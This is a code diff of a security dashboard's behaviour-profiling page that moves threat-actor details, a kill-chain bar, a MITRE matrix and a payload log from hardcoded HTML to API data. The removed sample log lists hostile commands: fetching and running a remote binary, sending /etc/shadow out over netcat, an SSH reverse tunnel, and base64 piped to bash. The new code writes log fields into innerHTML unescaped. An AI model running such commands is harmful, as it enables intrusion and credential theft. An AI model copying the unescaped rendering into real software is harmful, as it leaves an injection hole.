@@ -353,22 +353,27 @@
                     </div>
                     <div style="text-align:center; padding: 20px 0; border-bottom:1px solid #222;">
                         <i class="fas fa-user-hooded text-purple" style="font-size: 3rem; margin-bottom: 10px;"></i>
-                        <h3 class="text-white">FANCY BEAR</h3>
-                        <div class="text-xs text-muted">CONFIDENCE: <span class="text-green">99.4%</span></div>
+                        <h3 id="actor-name" class="text-white">FANCY BEAR</h3>
+                        <div class="text-xs text-muted">CONFIDENCE: <span id="actor-confidence"
+                                class="text-green">99.4%</span></div>
                     </div>
                     <div style="padding: 15px; flex:1;">
                         <h4 class="text-xs text-cyan" style="margin-bottom:10px;">BEHAVIORAL TRAITS</h4>
-                        <div class="psy-trait"><span>PERSISTENCE</span><span class="text-white">AGGRESSIVE</span></div>
-                        <div class="psy-trait"><span>LATERAL MOVEMENT</span><span class="text-white">SMB / WMI</span>
+                        <div class="psy-trait"><span>PERSISTENCE</span><span id="trait-persistence"
+                                class="text-white">AGGRESSIVE</span></div>
+                        <div class="psy-trait"><span>LATERAL MOVEMENT</span><span id="trait-lateral"
+                                class="text-white">SMB / WMI</span>
                         </div>
-                        <div class="psy-trait"><span>OBFUSCATION</span><span class="text-white">HIGH (XOR/BASE64)</span>
+                        <div class="psy-trait"><span>OBFUSCATION</span><span id="trait-obfuscation"
+                                class="text-white">HIGH (XOR/BASE64)</span>
                         </div>
-                        <div class="psy-trait"><span>TARGETING</span><span class="text-white">GOV / MILITARY</span>
+                        <div class="psy-trait"><span>TARGETING</span><span id="trait-targeting" class="text-white">GOV /
+                                MILITARY</span>
                         </div>
 
                         <div style="margin-top:15px;">
                             <h4 class="text-xs text-muted">KILL CHAIN PROGRESS</h4>
-                            <div class="killchain-bar">
+                            <div id="killchain-bar" class="killchain-bar">
                                 <div class="kc-seg" style="width:20%; background:var(--neon-purple);"
                                     data-label="Recon"></div>
                                 <div class="kc-seg" style="width:15%; background:var(--neon-purple);"
@@ -481,82 +486,124 @@
                     <span class="card-title">CAPTURED PAYLOAD STREAM</span>
                     <span class="badge">TTY-S0</span>
                 </div>
-                <div
+                <div id="terminal-stream"
                     style="background:#050505; flex:1; padding:15px; overflow-y:auto; font-family:'JetBrains Mono'; font-size:0.8rem;">
-                    <div style="color:#444; margin-bottom:10px;">// Monitoring inject vectors on pid: 4892</div>
-                    <div style="display:flex; gap:10px; border-bottom:1px solid #111; padding:4px 0;">
-                        <span class="text-muted">10:42:01</span><span class="text-pink">root@sys</span><span>wget
-                            http://185.x.x.x/bins/x86 -O /tmp/x86; chmod +x /tmp/x86; /tmp/x86</span>
-                    </div>
-                    <div style="display:flex; gap:10px; border-bottom:1px solid #111; padding:4px 0;">
-                        <span class="text-muted">10:42:05</span><span class="text-pink">root@sys</span><span>cat
-                            /etc/shadow | nc 5.188.x.x 1337</span>
-                    </div>
-                    <div style="display:flex; gap:10px; border-bottom:1px solid #111; padding:4px 0;">
-                        <span class="text-muted">10:42:12</span><span class="text-cyan">system</span><span>[ALERT]
-                            Outbound connection to known C2 IP (5.188.x.x) detected on port 1337</span>
-                    </div>
-                    <div style="display:flex; gap:10px; border-bottom:1px solid #111; padding:4px 0;">
-                        <span class="text-muted">10:42:20</span><span class="text-pink">root@sys</span><span>ssh -R
-                            9000:localhost:22 user@command-c2.net -N -f</span>
-                    </div>
-                    <div style="display:flex; gap:10px; border-bottom:1px solid #111; padding:4px 0;">
-                        <span class="text-muted">10:42:35</span><span class="text-pink">root@sys</span><span>base64 -d
-                            &#x3C;&#x3C;&#x3C; "ZXhwbGF5bG9hZAo=" | bash</span>
-                    </div>
+                    <div style="color:#444; margin-bottom:10px;">// Monitoring inject vectors dynamically...</div>
                 </div>
             </div>
 
         </main>
     </div>
 
-    <script>
-        // Vis.js Network Graph - WRAPPED IN TIMEOUT TO ENSURE LAYOUT IS READY
-        window.addEventListener('load', function () {
-            setTimeout(function () {
-                const container = document.getElementById('behaviorGraph');
-                const data = {
-                    nodes: [
-                        { id: 1, label: 'Entry Point (80)', color: '#ef4444', shape: 'dot', size: 20 },
-                        { id: 2, label: 'www-data', color: '#bc13fe', shape: 'dot' },
-                        { id: 3, label: '/bin/bash', color: '#bc13fe', shape: 'dot' },
-                        { id: 4, label: 'wget', color: '#bc13fe', shape: 'dot' },
-                        { id: 5, label: 'External IP', color: '#00f3ff', shape: 'diamond' },
-                        { id: 6, label: '/tmp/x86', color: '#ffee00', shape: 'square' },
-                        { id: 7, label: 'Persistence (Cron)', color: '#ef4444', shape: 'dot' },
-                        { id: 8, label: 'Lateral Mov (SMB)', color: '#ef4444', shape: 'dot' }
-                    ],
-                    edges: [
-                        { from: 1, to: 2 },
-                        { from: 2, to: 3 },
-                        { from: 3, to: 4, label: 'spawns' },
-                        { from: 4, to: 5, label: 'connects' },
-                        { from: 5, to: 6, label: 'downloads' },
-                        { from: 6, to: 7, label: 'installs' },
-                        { from: 3, to: 8, label: 'scans' }
-                    ]
-                };
-                const options = {
-                    nodes: {
-                        font: { color: '#ffffff', face: 'JetBrains Mono' },
-                        borderWidth: 1,
-                        shadow: { color: 'rgba(0,0,0,0.8)' }
-                    },
-                    edges: {
-                        color: '#444',
-                        smooth: { type: 'continuous' }
-                    },
-                    physics: {
-                        stabilization: true,
-                        barnesHut: { gravitationalConstant: -3000, springLength: 100, springConstant: 0.04 }
-                    },
-                    interaction: { hover: true, zoomView: true }
-                };
-                const network = new vis.Network(container, data, options);
+    <script type="module">
+        import { apiService } from './js/api.js';
 
-                // Force a fit
-                network.fit();
-            }, 300); // Small delay to allow DOM to settle
+        let network = null;
+
+        // Vis.js Network Graph - Dynamics
+        window.addEventListener('load', function () {
+
+            async function fetchAndRenderBehavior() {
+                try {
+                    const profileData = await apiService.get('/behavior/profile');
+
+                    // Render Graph Nodes/Edges
+                    const container = document.getElementById('behaviorGraph');
+
+                    const data = {
+                        nodes: new vis.DataSet(profileData.graph.nodes),
+                        edges: new vis.DataSet(profileData.graph.edges)
+                    };
+
+                    if (!network) {
+                        const options = {
+                            nodes: { font: { color: '#ffffff', face: 'JetBrains Mono' }, borderWidth: 1, shadow: { color: 'rgba(0,0,0,0.8)' } },
+                            edges: { color: '#444', smooth: { type: 'continuous' } },
+                            physics: { stabilization: true, barnesHut: { gravitationalConstant: -3000, springLength: 100, springConstant: 0.04 } },
+                            interaction: { hover: true, zoomView: true }
+                        };
+                        network = new vis.Network(container, data, options);
+                        setTimeout(() => network.fit(), 300);
+                    } else {
+                        network.setData(data); // In-place update
+                    }
+
+                    // Update UI: Threat Actor Panel
+                    document.getElementById('actor-name').innerText = profileData.actor.name;
+                    document.getElementById('actor-confidence').innerText = `${profileData.actor.confidence}%`;
+                    document.getElementById('trait-persistence').innerText = profileData.actor.traits.Persistence;
+                    document.getElementById('trait-lateral').innerText = profileData.actor.traits["Lateral Movement"];
+                    document.getElementById('trait-obfuscation').innerText = profileData.actor.traits.Obfuscation;
+                    document.getElementById('trait-targeting').innerText = profileData.actor.traits.Targeting;
+
+                    // Update Kill Chain Bar
+                    const kcBar = document.getElementById('killchain-bar');
+                    const segments = kcBar.querySelectorAll('.kc-seg');
+
+                    const activeIndex = profileData.killchain.active_index;
+                    let labels = ["Recon", "Weaponize", "Deliver", "Exploit", "Install", "C2", "Actions"];
+                    labels[activeIndex] = `${labels[activeIndex]} (ACTIVE)`;
+
+                    segments.forEach((seg, idx) => {
+                        seg.dataset.label = labels[idx] || "Pending...";
+                        if (idx < activeIndex) {
+                            seg.style.background = 'var(--neon-purple)';
+                            seg.style.animation = 'none';
+                        } else if (idx === activeIndex) {
+                            seg.style.background = 'var(--neon-pink)';
+                            seg.style.animation = 'pulse 1s infinite';
+                        } else {
+                            seg.style.background = '#222';
+                            seg.style.animation = 'none';
+                        }
+                    });
+
+                    // Update MITRE Matrix Classes
+                    const techCards = document.querySelectorAll('.tech-card');
+                    techCards.forEach(card => {
+                        // Strip formatting classes
+                        card.classList.remove('active-critical', 'active-high', 'active-med');
+
+                        // Parse T-Code from HTML text (e.g., "T1190 Exploit Public App" -> "T1190")
+                        const textContent = card.innerText;
+                        const match = textContent.match(/^(T\d{4}(\.\d+)?)/);
+
+                        if (match) {
+                            const tCode = match[1];
+                            const severity = profileData.mitre[tCode];
+
+                            if (severity === 'critical') card.classList.add('active-critical');
+                            else if (severity === 'high') card.classList.add('active-high');
+                            else if (severity === 'med') card.classList.add('active-med');
+                        }
+                    });
+
+                    // Update Terminal Payload Stream
+                    const termStream = document.getElementById('terminal-stream');
+                    termStream.innerHTML = '<div style="color:#444; margin-bottom:10px;">// Extracted Temporal Payloads</div>';
+
+                    profileData.logs.forEach(log => {
+                        const div = document.createElement('div');
+                        div.style.cssText = 'display:flex; gap:10px; border-bottom:1px solid #111; padding:4px 0;';
+                        div.innerHTML = `
+                            <span class="text-muted">${log.time}</span>
+                            <span style="color:${log.userColor}">${log.user}</span>
+                            <span>${log.msg}</span>
+                        `;
+                        termStream.appendChild(div);
+                    });
+
+                    // Auto scroll to bottom
+                    termStream.scrollTop = termStream.scrollHeight;
+
+                } catch (e) {
+                    console.error("Failed to fetch behavior profile:", e);
+                }
+            }
+
+            // Execute on load and poll
+            fetchAndRenderBehavior();
+            setInterval(fetchAndRenderBehavior, 15000);
 
             // --- CUSTOM MODAL LOGIC FOR BEHAVIOR PROFILING ---
             const topModal = document.getElementById('custom-modal');
